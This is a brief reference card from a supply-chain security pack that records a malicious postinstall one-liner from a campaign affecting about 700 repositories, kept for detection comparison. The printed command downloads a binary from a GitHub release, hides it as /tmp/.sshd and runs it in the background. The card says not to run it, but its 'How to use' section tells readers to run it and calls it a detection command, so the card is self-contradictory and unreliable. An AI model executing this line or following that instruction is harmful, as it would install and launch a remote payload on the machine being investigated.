---
title: "Postinstall hook reference (inspect, do not run)"
slug: "postinstall-hook-reference"
category: "supply-chain"
type: "command"
tags: ["supply-chain", "ioc"]
source: "https://composedsecurity.com/blog/postinstall-hook-700-repos"
source_label: "The hook (reference, don't run)"
---

# Postinstall hook reference (inspect, do not run)

The exact malicious postinstall one-liner from the 700-repo campaign, kept for detection comparison. Do not run.

> Part of the **Supply Chain & Incident Response** pack. From the Composed Security blog: [700 repos. One postinstall hook.](https://composedsecurity.com/blog/postinstall-hook-700-repos).

## Command

```text
curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &
```

## How to use

Copy the command, review every path it touches, then run it in the repository or machine you are investigating. This is a detection command, not a fix.

---

Found this useful? [Composed Security](https://composedsecurity.com) reviews your pull requests for exactly this class of bug.
